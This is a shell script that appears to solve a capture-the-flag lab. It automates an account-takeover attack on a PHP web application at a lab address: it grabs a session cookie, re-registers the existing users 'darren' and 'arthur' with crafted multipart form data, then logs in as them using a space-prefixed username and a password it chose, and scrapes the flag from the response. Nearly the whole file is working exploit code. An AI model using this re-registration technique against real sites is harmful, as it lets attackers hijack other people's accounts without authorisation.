#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.195.209"
attack_ip="10.10.113.137"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:8088" -c "/work/7-cookies.txt" -L > /dev/null
PHPSESSID=$(grep PHPSESSID "/work/7-cookies.txt" | awk '{print $7}')
echo "--> Session initiated : $PHPSESSID"

# Registering darren a second time --- CAUTION : The boundary in the file is the one Content-Type plus 2 entry -- !!!
echo "2 - REGISTERING DARREN"
curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -H "Content-Type: multipart/form-data; boundary=--------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/darren.txt > /dev/null

# Logging as adrren
echo "3 - ANALYZING DARREN"
curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=+darren" -d "pass=test" -o /work/7-darren.html
echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-darren.html | sed ':a;N;$!ba;s/[\n\t ]//g')" 

# Registering arthur a second time
echo "4 - REGISTERING ARTHUR"
curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -H "Content-Type: multipart/form-data; boundary=--------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/arthur.txt > /dev/null

# Logging as arthur
echo "5 - ANALYZING ARTHUR"
curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=+arthur" -d "pass=test" -o /work/7-arthur.html
echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-arthur.html | sed ':a;N;$!ba;s/[\n\t ]//g')"
